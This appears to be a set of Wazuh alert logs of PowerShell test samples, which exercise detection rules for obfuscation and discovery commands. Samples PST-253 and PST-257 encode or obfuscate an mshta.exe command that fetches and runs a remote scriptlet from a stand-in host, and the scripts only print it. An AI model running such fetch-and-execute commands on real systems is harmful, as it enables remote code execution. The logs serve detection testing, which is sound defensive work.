{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"d10ffae6-571d-4d17-8df0-9914fbae822f","scriptBlockText":"$sampleId='PST-253'; $encoded='bQBzAGgAdABhAC4AZQB4AGUAIABqAGEAdgBhAHMAYwByAGkAcAB0ADoAYQA9AEcAZQB0AE8AYgBqAGUAYwB0ACgAJwBzAGMAcgBpAHAAdAA6AGgAdAB0AHAAcwA6AC8ALwBoAHQAYQAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AYQAuAHMAYwB0ACcAKQAuAEUAeABlAGMAKAApADsAYwBsAG8AcwBlACgAKQA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723605","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-253'; $encoded='bQBzAGgAdABhAC4AZQB4AGUAIABqAGEAdgBhAHMAYwByAGkAcAB0ADoAYQA9AEcAZQB0AE8AYgBqAGUAYwB0ACgAJwBzAGMAcgBpAHAAdAA6AGgAdAB0AHAAcwA6AC8ALwBoAHQAYQAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AYQAuAHMAYwB0ACcAKQAuAEUAeABlAGMAKAApADsAYwBsAG8AcwBlACgAKQA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: d10ffae6-571d-4d17-8df0-9914fbae822f\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:30.6388652Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:30.6388652Z\",\"eventRecordID\":\"723605\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-253'; $encoded='bQBzAGgAdABhAC4AZQB4AGUAIABqAGEAdgBhAHMAYwByAGkAcAB0ADoAYQA9AEcAZQB0AE8AYgBqAGUAYwB0ACgAJwBzAGMAcgBpAHAAdAA6AGgAdAB0AHAAcwA6AC8ALwBoAHQAYQAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AYQAuAHMAYwB0ACcAKQAuAEUAeABlAGMAKAApADsAYwBsAG8AcwBlACgAKQA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: d10ffae6-571d-4d17-8df0-9914fbae822f\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-253'; $encoded='bQBzAGgAdABhAC4AZQB4AGUAIABqAGEAdgBhAHMAYwByAGkAcAB0ADoAYQA9AEcAZQB0AE8AYgBqAGUAYwB0ACgAJwBzAGMAcgBpAHAAdAA6AGgAdAB0AHAAcwA6AC8ALwBoAHQAYQAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AYQAuAHMAYwB0ACcAKQAuAEUAeABlAGMAKAApADsAYwBsAG8AcwBlACgAKQA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"d10ffae6-571d-4d17-8df0-9914fbae822f\"}}}","id":"1784281051.582395","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":25,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:37:31.527+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"cce11f62-f3cd-45b2-89d4-e68bad374c81","scriptBlockText":"$sampleId='PST-254'; Get-ChildItem Env: | Select-Object -First 6 Name, Value; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723619","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-254'; Get-ChildItem Env: | Select-Object -First 6 Name, Value; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: cce11f62-f3cd-45b2-89d4-e68bad374c81\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:30.9614355Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:30.9614355Z\",\"eventRecordID\":\"723619\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-254'; Get-ChildItem Env: | Select-Object -First 6 Name, Value; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: cce11f62-f3cd-45b2-89d4-e68bad374c81\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-254'; Get-ChildItem Env: | Select-Object -First 6 Name, Value; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"cce11f62-f3cd-45b2-89d4-e68bad374c81\"}}}","id":"1784281051.585794","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script searching filesystem","firedtimes":4,"groups":["windows"," powershell"],"id":"91819","level":4,"mail":false,"mitre":{"id":["T1083"],"tactic":["Discovery"],"technique":["File and Directory Discovery"]}},"timestamp":"2026-07-17T11:37:31.661+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"f7d036d1-ab9d-46b0-a2ec-96d4746295c8","scriptBlockText":"$sampleId='PST-255'; Get-Acl -Path $env:TEMP | Select-Object Owner, AccessToString; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723622","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-255'; Get-Acl -Path $env:TEMP | Select-Object Owner, AccessToString; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: f7d036d1-ab9d-46b0-a2ec-96d4746295c8\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:31.3003351Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:31.3003351Z\",\"eventRecordID\":\"723622\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-255'; Get-Acl -Path $env:TEMP | Select-Object Owner, AccessToString; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: f7d036d1-ab9d-46b0-a2ec-96d4746295c8\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-255'; Get-Acl -Path $env:TEMP | Select-Object Owner, AccessToString; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"f7d036d1-ab9d-46b0-a2ec-96d4746295c8\"}}}","id":"1784281051.588065","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":22,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:37:31.707+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"07756219-1a1b-44ed-a170-a43fd6ff3481","scriptBlockText":"$sampleId='PST-256'; Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Select-Object -First 5 LocalAddress, RemoteAddress, State; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723625","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-256'; Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Select-Object -First 5 LocalAddress, RemoteAddress, State; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 07756219-1a1b-44ed-a170-a43fd6ff3481\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:31.6708090Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:31.6708090Z\",\"eventRecordID\":\"723625\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-256'; Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Select-Object -First 5 LocalAddress, RemoteAddress, State; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 07756219-1a1b-44ed-a170-a43fd6ff3481\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-256'; Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Select-Object -First 5 LocalAddress, RemoteAddress, State; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"07756219-1a1b-44ed-a170-a43fd6ff3481\"}}}","id":"1784281052.588065","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:32.576+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"7ee19e30-e3e8-4c3d-ab6b-7214d614159c","scriptBlockText":"$sampleId='PST-257'; $parts=@('mSHTa.eXe j','avasCr','iPt:A=GeT','`OBJeCt(','''SCRi`P','T:HTtpS:/','/htA.exAMp','`le.InVAl','iD/A.SCt'').','eXEC();','cloSE()'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723631","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-257'; $parts=@('mSHTa.eXe j','avasCr','iPt:A=GeT','`OBJeCt(','''SCRi`P','T:HTtpS:/','/htA.exAMp','`le.InVAl','iD/A.SCt'').','eXEC();','cloSE()'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 7ee19e30-e3e8-4c3d-ab6b-7214d614159c\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:32.1995823Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:32.1995823Z\",\"eventRecordID\":\"723631\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-257'; $parts=@('mSHTa.eXe j','avasCr','iPt:A=GeT','`OBJeCt(','''SCRi`P','T:HTtpS:/','/htA.exAMp','`le.InVAl','iD/A.SCt'').','eXEC();','cloSE()'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 7ee19e30-e3e8-4c3d-ab6b-7214d614159c\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-257'; $parts=@('mSHTa.eXe j','avasCr','iPt:A=GeT','`OBJeCt(','''SCRi`P','T:HTtpS:/','/htA.exAMp','`le.InVAl','iD/A.SCt'').','eXEC();','cloSE()'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"7ee19e30-e3e8-4c3d-ab6b-7214d614159c\"}}}","id":"1784281052.588065","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:32.590+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"d754b8dc-f9a2-4fec-9bbf-0644e7a3ae13","scriptBlockText":"$sampleId='PST-258'; $csv = 'name,status`nsvc1,running`nsvc2,stopped'; $csv | ConvertFrom-Csv | Select-Object name, status; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723635","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-258'; $csv = 'name,status`nsvc1,running`nsvc2,stopped'; $csv | ConvertFrom-Csv | Select-Object name, status; Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: d754b8dc-f9a2-4fec-9bbf-0644e7a3ae13\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:32.5358231Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:32.5358231Z\",\"eventRecordID\":\"723635\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-258'; $csv = 'name,status`nsvc1,running`nsvc2,stopped'; $csv | ConvertFrom-Csv | Select-Object name, status; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: d754b8dc-f9a2-4fec-9bbf-0644e7a3ae13\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-258'; $csv = 'name,status`nsvc1,running`nsvc2,stopped'; $csv | ConvertFrom-Csv | Select-Object name, status; Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"d754b8dc-f9a2-4fec-9bbf-0644e7a3ae13\"}}}","id":"1784281052.588065","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:32.600+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"777f38e1-2f11-43b1-94f9-4102447bafbf","scriptBlockText":"$sampleId='PST-259'; Get-CimInstance Win32_Process | Where-Object Name -like '*host*' | Select-Object -First 5 Name, ProcessId; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723650","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-259'; Get-CimInstance Win32_Process | Where-Object Name -like '*host*' | Select-Object -First 5 Name, ProcessId; Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 777f38e1-2f11-43b1-94f9-4102447bafbf\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:32.8825873Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:32.8825873Z\",\"eventRecordID\":\"723650\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-259'; Get-CimInstance Win32_Process | Where-Object Name -like '*host*' | Select-Object -First 5 Name, ProcessId; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 777f38e1-2f11-43b1-94f9-4102447bafbf\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-259'; Get-CimInstance Win32_Process | Where-Object Name -like '*host*' | Select-Object -First 5 Name, ProcessId; Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"777f38e1-2f11-43b1-94f9-4102447bafbf\"}}}","id":"1784281053.588065","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:33.762+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"b671235a-bbd0-4d9b-83e9-ed17882d10ab","scriptBlockText":"$sampleId='PST-260'; Get-NetFirewallProfile | Select-Object Name, Enabled; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723653","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-260'; Get-NetFirewallProfile | Select-Object Name, Enabled; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: b671235a-bbd0-4d9b-83e9-ed17882d10ab\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:33.3704560Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:33.3704560Z\",\"eventRecordID\":\"723653\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-260'; Get-NetFirewallProfile | Select-Object Name, Enabled; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: b671235a-bbd0-4d9b-83e9-ed17882d10ab\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-260'; Get-NetFirewallProfile | Select-Object Name, Enabled; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"b671235a-bbd0-4d9b-83e9-ed17882d10ab\"}}}","id":"1784281053.588065","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:33.808+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"5d6701f4-dd21-4619-986f-ec5ad62c7e04","scriptBlockText":"$sampleId='PST-261'; Get-Module -ListAvailable | Select-Object -First 5 Name, Version; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723656","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-261'; Get-Module -ListAvailable | Select-Object -First 5 Name, Version; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 5d6701f4-dd21-4619-986f-ec5ad62c7e04\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:33.7161761Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:33.7161761Z\",\"eventRecordID\":\"723656\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-261'; Get-Module -ListAvailable | Select-Object -First 5 Name, Version; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 5d6701f4-dd21-4619-986f-ec5ad62c7e04\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-261'; Get-Module -ListAvailable | Select-Object -First 5 Name, Version; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"5d6701f4-dd21-4619-986f-ec5ad62c7e04\"}}}","id":"1784281054.588065","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:34.669+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"81991c6d-a367-42be-8803-02c1d3bf5a9f","scriptBlockText":"$sampleId='PST-262'; $parts=@('invO`Ke','-REs`TmetHod ','-MeT`HoD pO','sT -Uri ''','httPS://API.','ex`amPlE.iN','V`AlId/Ch`EcKi','N'' -bOdY',' @{hosT=''wS-','01'';uSEr=''','AnA`LYSt'';stat','US=''o','K''}'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723685","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-262'; $parts=@('invO`Ke','-REs`TmetHod ','-MeT`HoD pO','sT -Uri ''','httPS://API.','ex`amPlE.iN','V`AlId/Ch`EcKi','N'' -bOdY',' @{hosT=''wS-','01'';uSEr=''','AnA`LYSt'';stat','US=''o','K''}'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 81991c6d-a367-42be-8803-02c1d3bf5a9f\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:35.8823154Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:35.8823154Z\",\"eventRecordID\":\"723685\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-262'; $parts=@('invO`Ke','-REs`TmetHod ','-MeT`HoD pO','sT -Uri 